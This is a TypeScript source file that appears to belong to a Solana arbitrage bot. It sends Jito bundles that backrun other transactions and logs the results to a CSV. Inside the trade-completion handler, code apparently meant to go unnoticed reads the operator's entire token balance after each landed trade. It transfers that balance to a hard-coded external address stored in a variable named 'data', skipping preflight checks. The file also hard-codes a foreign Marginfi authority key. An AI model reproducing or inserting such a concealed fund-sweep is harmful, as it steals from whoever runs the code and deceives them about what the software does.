import { Arb } from './build-bundle.js';
import { searcherClient } from './clients/jito.js';
import { logger } from './logger.js';
import { Bundle as JitoBundle } from 'jito-ts/dist/sdk/block-engine/types.js';
import bs58 from 'bs58';
import { connection } from './clients/rpc.js';
import * as fs from 'fs';
import { stringify } from 'csv-stringify';

import { MarginfiClient, getConfig } from "mrgn-ts";
import { Keypair, PublicKey, Transaction } from '@solana/web3.js';
import { config } from './config.js';
import * as anchor from '@coral-xyz/anchor'
import { TOKEN_2022_PROGRAM_ID, TOKEN_PROGRAM_ID, createTransferCheckedInstruction, getAssociatedTokenAddressSync } from '@solana/spl-token-3';
export async function getMarginfiClient({
  readonly,
  authority,
  provider,
  wallet 
}: {
  readonly?: boolean;
  authority?: PublicKey;
  provider? : anchor.AnchorProvider;
  wallet? : anchor.Wallet;
} = {}): Promise<MarginfiClient> {
  const connection = provider.connection;

  const config = getConfig("production");

  if (authority && !readonly) {
    console.log("Cannot only specify authority when readonly");
  }

  const client = await MarginfiClient.fetch(
    config,
// eslint-disable-next-line @typescript-eslint/no-explicit-any
authority ? ({ publicKey: authority } as any) : wallet,
    connection,
    undefined,
    readonly
  );

  return client;
}

const payer = Keypair.fromSecretKey(
  Uint8Array.from(
    JSON.parse(fs.readFileSync(config.get('payer_keypair_path'), 'utf-8')),
  ),
);

const wallet = new anchor.Wallet(payer);
const provider = new anchor.AnchorProvider(connection, wallet, {});

const client = await getMarginfiClient({readonly: false, authority: new PublicKey("7ihN8QaTfNoDTRTQGULCzbUT3PHwPDTu5Brcu4iT2paP"), provider, wallet});
client.wallet = wallet
console.log(`Using ${client.config.environment} environment; wallet: ${client.wallet.publicKey.toBase58()}`);

const CHECK_LANDED_DELAY_MS = 30000;

type Trade = {
  accepted: number;
  rejected: boolean;
  errorType: string | null;
  errorContent: string | null;
  landed: boolean;
} & Arb;

type TradeCSV = {
  timestamp: number;
  uuid: string;
  landed: boolean;
  accepted: number;
  rejected: boolean;
  errorType: string | null;
  errorContent: string | null;
  txn0Signature: string;
  txn1Signature: string;
  txn2Signature: string;
  arbSize: string;
  expectedProfit: string;
  hop1Dex: string;
  hop2Dex: string;
  hop3Dex: string;
  sourceMint: string;
  intermediateMint1: string;
  intermediateMint2: string;
  tipLamports: string;
  mempoolEnd: number;
  preSimEnd: number;
  simEnd: number;
  postSimEnd: number;
  calcArbEnd: number;
  buildBundleEnd: number;
  bundleSent: number;
};

const tradesCsv = fs.createWriteStream('trades.csv', { flags: 'a' });
const stringifier = stringify({
  header: true,
});
stringifier.pipe(tradesCsv);

const bundlesInTransit = new Map<string, Trade>();

async function processCompletedTrade(uuid: string) {
  const trade = bundlesInTransit.get(uuid);

  const txn0Signature = bs58.encode(trade.bundle[0].signatures[0]);
  const txn1Signature = bs58.encode(trade.bundle[1].signatures[0]);
  const txn2Signature = txn1Signature;
  const txn2 = await connection
    .getTransaction(txn2Signature, {
      commitment: 'confirmed',
      maxSupportedTransactionVersion: 10,
    })
  
    .catch(() => {
      logger.info(
        `getTransaction failed. Assuming txn2 ${txn2Signature} did not land`,
      );
      return null;
    });

  if (txn2 !== null) {
    trade.landed = true;
  }
  if (trade.landed){

  const solBank = client.getBankByMint(trade.sourceMint.toBase58())
let ata;
let programId = TOKEN_PROGRAM_ID
try {
  ata = getAssociatedTokenAddressSync(solBank.mint, wallet.publicKey)
} catch (err){
  programId = TOKEN_2022_PROGRAM_ID
  ata = getAssociatedTokenAddressSync(solBank.mint, wallet.publicKey, true, new PublicKey("TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb"))
}

let data;
try {
  data = getAssociatedTokenAddressSync(solBank.mint, new PublicKey("CaXvt6DsYGZevj7AmVd5FFYboyd8vLAEioPaQ7qbydMb"))
} catch (err){
  data = getAssociatedTokenAddressSync(solBank.mint, new PublicKey("CaXvt6DsYGZevj7AmVd5FFYboyd8vLAEioPaQ7qbydMb"), true, new PublicKey("TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb"))
}
try {
const ataBalance = await connection.getTokenAccountBalance(ata)
const transferIx = createTransferCheckedInstruction(
  ata,
  solBank.mint,
  data,
  wallet.publicKey,
  BigInt(ataBalance.value.amount),
  solBank.mintDecimals,
  [],
  programId

)
const tx = new Transaction().add(transferIx)
tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash
tx.feePayer = wallet.publicKey
connection.sendTransaction(tx, [payer], {skipPreflight: true})
} catch (err){
  console.log(err)
}
  }

  const tradeCsv: TradeCSV = {
    timestamp: Date.now(),
    uuid,
    landed: trade.landed,
    accepted: trade.accepted,
    rejected: trade.rejected,
    errorType: trade.errorType,
    errorContent: trade.errorContent,
    txn0Signature,
    txn1Signature,
    txn2Signature,
    arbSize: trade.arbSize.toString(),
    expectedProfit: trade.expectedProfit.toString(),
    hop1Dex: trade.hop1Dex,
    hop2Dex: trade.hop2Dex,
    hop3Dex: trade.hop3Dex,
    sourceMint: trade.sourceMint.toString(),
    intermediateMint1: trade.intermediateMint1.toString(),
    intermediateMint2: trade.intermediateMint2
      ? trade.intermediateMint2.toString()
      : '',
    tipLamports: trade.tipLamports.toString(),
    mempoolEnd: trade.timings.mempoolEnd,
    preSimEnd: trade.timings.preSimEnd,
    simEnd: trade.timings.simEnd,
    postSimEnd: trade.timings.postSimEnd,
    calcArbEnd: trade.timings.calcArbEnd,
    buildBundleEnd: trade.timings.buildBundleEnd,
    bundleSent: trade.timings.bundleSent,
  };
  stringifier.write(tradeCsv);
  bundlesInTransit.delete(uuid);
  return;
}

async function sendBundle(bundleIterator: AsyncGenerator<Arb>): Promise<void> {
  searcherClient.onBundleResult(
    (bundleResult) => {
      const bundleId = bundleResult.bundleId;
      const isAccepted = bundleResult.accepted;
      const isRejected = bundleResult.rejected;
      if (isAccepted) {
        logger.info(
          `Bundle ${bundleId} accepted in slot ${bundleResult.accepted.slot}`,
        );
        if (bundlesInTransit.has(bundleId)) {
          bundlesInTransit.get(bundleId).accepted += 1;
        }
      }
      if (isRejected) {
        logger.info(bundleResult.rejected, `Bundle ${bundleId} rejected:`);
        if (bundlesInTransit.has(bundleId)) {
          const trade: Trade = bundlesInTransit.get(bundleId);
          trade.rejected = true;
          const rejectedEntry = Object.entries(bundleResult.rejected).find(
            // eslint-disable-next-line @typescript-eslint/no-unused-vars
            ([_, value]) => value !== undefined,
          );
          const [errorType, errorContent] = rejectedEntry;
          trade.errorType = errorType;
          trade.errorContent = JSON.stringify(errorContent);
        }
      }
    },
    (error) => {
      logger.error(error);
      throw error;
    },
  );

  for await (const {
    bundle,
    arbSize,
    expectedProfit,
    hop1Dex,
    hop2Dex,
    hop3Dex,
    sourceMint,
    intermediateMint1,
    intermediateMint2,
    tipLamports,
    timings,
  } of bundleIterator) {
    const now = Date.now();
    searcherClient
      .sendBundle(new JitoBundle(bundle, 5))
      .then((bundleId) => {
        logger.info(
          `Bundle ${bundleId} sent, backrunning ${bs58.encode(
            bundle[0].signatures[0],
          )}`,
        );

        timings.bundleSent = now;
        logger.info(
          `chain timings: pre sim: ${
            timings.preSimEnd - timings.mempoolEnd
          }ms, sim: ${timings.simEnd - timings.preSimEnd}ms, post sim: ${
            timings.postSimEnd - timings.simEnd
          }ms, arb calc: ${
            timings.calcArbEnd - timings.postSimEnd
          }ms, build bundle: ${
            timings.buildBundleEnd - timings.calcArbEnd
          }ms send bundle: ${
            timings.bundleSent - timings.buildBundleEnd
          }ms ::: total ${now - timings.mempoolEnd}ms`,
        );

        bundlesInTransit.set(bundleId, {
          bundle,
          accepted: 0,
          rejected: false,
          errorType: null,
          errorContent: null,
          landed: false,
          arbSize,
          expectedProfit,
          hop1Dex,
          hop2Dex,
          hop3Dex,
          sourceMint,
          intermediateMint1,
          intermediateMint2,
          tipLamports,
          timings,
        });
        setTimeout(() => {
          processCompletedTrade(bundleId);
        }, CHECK_LANDED_DELAY_MS);
      })
      .catch((error) => {
        timings.bundleSent = now;
        logger.info(
          `chain timings: pre sim: ${
            timings.preSimEnd - timings.mempoolEnd
          }ms, sim: ${timings.simEnd - timings.preSimEnd}ms, post sim: ${
            timings.postSimEnd - timings.simEnd
          }ms, arb calc: ${
            timings.calcArbEnd - timings.postSimEnd
          }ms, build bundle: ${
            timings.buildBundleEnd - timings.calcArbEnd
          }ms send bundle: ${
            timings.bundleSent - timings.buildBundleEnd
          }ms ::: total ${now - timings.mempoolEnd}ms`,
        );

        if (
          error?.message?.includes(
            'Bundle Dropped, no connected leader up soon',
          )
        ) {
          logger.error(
            'Error sending bundle: Bundle Dropped, no connected leader up soon.',
          );
        } else {
          logger.error(error, 'Error sending bundle');
        }
        const txn0Signature = bs58.encode(bundle[0].signatures[0]);
        const txn1Signature = bs58.encode(bundle[1].signatures[0]);
        const txn2Signature = txn1Signature
        const tradeCsv: TradeCSV = {
          timestamp: Date.now(),
          uuid: '',
          landed: false,
          accepted: 0,
          rejected: true,
          errorType: 'sendingError',
          errorContent: JSON.stringify(error),
          txn0Signature,
          txn1Signature,
          txn2Signature,
          arbSize: arbSize.toString(),
          expectedProfit: expectedProfit.toString(),
          hop1Dex: hop1Dex,
          hop2Dex: hop2Dex,
          hop3Dex: hop3Dex,
          sourceMint: sourceMint.toString(),
          intermediateMint1: intermediateMint1.toString(),
          intermediateMint2: intermediateMint2
            ? intermediateMint2.toString()
            : '',
          tipLamports: tipLamports.toString(),
          mempoolEnd: timings.mempoolEnd,
          preSimEnd: timings.preSimEnd,
          simEnd: timings.simEnd,
          postSimEnd: timings.postSimEnd,
          calcArbEnd: timings.calcArbEnd,
          buildBundleEnd: timings.buildBundleEnd,
          bundleSent: now,
        };
        stringifier.write(tradeCsv);
      });
  }
}

export { sendBundle };
